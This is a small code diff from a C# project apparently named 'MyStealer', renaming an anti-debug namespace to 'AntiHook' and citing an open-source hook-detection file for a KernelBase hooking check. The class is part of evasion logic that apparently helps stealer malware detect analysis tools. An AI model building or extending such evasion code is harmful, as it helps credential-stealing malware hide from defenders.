@@ -1,5 +1,8 @@
-﻿namespace MyStealer.AntiDebug.Check.AntiAntiAntiDebug
+﻿namespace MyStealer.AntiDebug.Check.AntiHook
 {
+    /// <summary>
+    /// https://github.com/AdvDebug/AntiCrack-DotNet/blob/main/AntiCrack-DotNet/HooksDetection.cs
+    /// </summary>
     internal class KernelBaseCheck : HookCheckBase
     {
         public override string Name => "Hooking: KernelBase";
